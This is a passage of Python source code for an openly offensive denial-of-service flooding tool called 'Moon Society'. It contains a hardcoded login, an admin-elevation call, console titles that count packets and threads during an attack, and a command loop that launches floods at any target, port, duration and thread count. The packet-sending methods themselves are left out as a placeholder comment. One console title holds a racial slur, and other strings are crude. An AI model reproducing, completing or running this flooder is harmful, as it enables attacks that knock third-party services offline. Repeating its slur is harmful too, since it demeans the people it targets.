        Fore.LIGHTGREEN_EX, Fore.GREEN,
        Fore.LIGHTCYAN_EX, Fore.CYAN,
        Fore.LIGHTBLUE_EX, Fore.BLUE,
        Fore.LIGHTMAGENTA_EX, Fore.MAGENTA
    ]
    result = ""
    steps = len(text)
    color_step = len(colors) / max(1, steps)
    
    for i, char in enumerate(text):
        color_index = int(i * color_step) % len(colors)
        result += colors[color_index] + char
    
    return result

def title_manager():
    global current_title, attack_start_time, packets_sent, is_attacking
    titles = [
        "ahhhhhh made by hasan",
        "fuck interpool the niggas",
        "interpool most memes",
        f"do you know your ip is {fake_ip()}"
    ]
    
    while True:
        if is_attacking:
            with title_lock:
                elapsed = int(time.time() - attack_start_time)
                title = f"Attack Time: {elapsed}s | Packets: {packets_sent} | Threads: {threading.active_count()}"
                if os.name == 'nt':
                    ctypes.windll.kernel32.SetConsoleTitleW(title)
                current_title = title
        else:
            title = random.choice(titles)
            if os.name == 'nt':
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            with title_lock:
                current_title = title
        
        time.sleep(0.5)

def fake_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def calculate_checksum(data):
    """Calculate IP/TCP checksum efficiently"""
    if len(data) % 2:
        data += b'\x00'
    words = struct.unpack('!%dH' % (len(data) // 2), data)
    total = sum(words)
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF

def resource_monitor():
    """Monitor system resources and throttle attacks if needed"""
    global is_attacking
    while True:
        if is_attacking:
            cpu_percent = psutil.cpu_percent(interval=1)
            mem_percent = psutil.virtual_memory().percent
            
            if cpu_percent > 85 or mem_percent > 85:
                time.sleep(0.1)
            elif cpu_percent > 70 or mem_percent > 70:
                time.sleep(0.05)
            else:
                time.sleep(0.01)
        else:
            time.sleep(1)

def secure_login():
    """Secure login panel"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTMAGENTA_EX + SECURE_LOADER)
    print(Fore.MAGENTA + "                                         HASAN LOGIN")
    
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        username = input(Fore.CYAN + "Username: " + Style.RESET_ALL)
        password = input(Fore.CYAN + "Password: " + Style.RESET_ALL)
        
        if username == "hasan" and password == "hasan":
            print(Fore.GREEN + "\nAuthentication successful!")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(Fore.RED + f"\nInvalid credentials! {remaining} attempts remaining.")
            time.sleep(1.5)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.LIGHTMAGENTA_EX + SECURE_LOADER)
            print(Fore.MAGENTA + "                                                            HASAN LOGIN")
            print(Style.RESET_ALL + "="*80)
    
    print(Fore.RED + "\nMaximum login attempts exceeded. Exiting...")
    time.sleep(2)
    sys.exit(1)

# [Rest of your attack methods...]

def main():
    global is_attacking, resource_monitor_active
    
    if not secure_login():
        return
    
    force_admin()
    
    title_thread = threading.Thread(target=title_manager, daemon=True)
    title_thread.start()
    
    if 'psutil' in sys.modules and not resource_monitor_active:
        resource_thread = threading.Thread(target=resource_monitor, daemon=True)
        resource_thread.start()
        resource_monitor_active = True
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTMAGENTA_EX + MOON_SOCIETY_ASCII)
    print(Fore.LIGHTYELLOW_EX + "- LOADING CUMSHOOT")
    
    for i in range(3):
        time.sleep(0.3)
        print(Fore.LIGHTYELLOW_EX + f"- Loading module {i+1}/3")
    
    print(Fore.LIGHTYELLOW_EX + "- READY FOR OPERATION")
    time.sleep(0.5)
    os.system('cls' if os.name == 'nt' else 'clear')
    
    while True:
        try:
            print(Fore.LIGHTMAGENTA_EX + "Type 'help' to show commands")
            cmd = input("\n" + Fore.LIGHTMAGENTA_EX + "[hasan@ms] - " + Fore.LIGHTWHITE_EX)
            
            if cmd == "help":
                show_help()
            elif cmd == "exit":
                print(Fore.LIGHTGREEN_EX + "Exiting Moon Society...")
                sys.exit(0)
            elif cmd == "back" or cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            else:
                parts = cmd.split()
                if len(parts) >= 2:
                    method = parts[0].lower()
                    target = parts[1]
                    
                    if method == "icmp":
                        port = None
                        duration = int(parts[2]) if len(parts) >= 3 else 60
                        thread_count = int(parts[3]) if len(parts) >= 4 else 1000
                    else:
                        port = int(parts[2]) if len(parts) >= 3 else 80
                        duration = int(parts[3]) if len(parts) >= 4 else 60
                        thread_count = int(parts[4]) if len(parts) >= 5 else 1000
                    
                    threads = launch_attack(method, target, port, duration, thread_count)
                    
                    if threads:
                        show_attack_summary(method, target, port, duration, thread_count)
                        start_wait = time.time()
                        while time.time() - start_wait < duration:
                            time.sleep(1)
                            
                        is_attacking = False
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(Fore.LIGHTGREEN_EX + f"Attack completed! Sent {packets_sent} packets!")
                    else:
                        print(Fore.LIGHTRED_EX + "Failed to launch attack!")
                else:
                    print(Fore.LIGHTRED_EX + "Invalid command format! Use [method] [target] [port] [time] [threads]")
                    
        except KeyboardInterrupt:
            print("\n" + Fore.LIGHTGREEN_EX + "Exiting Moon Society...")
            sys.exit(0)
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"Error: {str(e)}")

if __name__ == "__main__":
    main()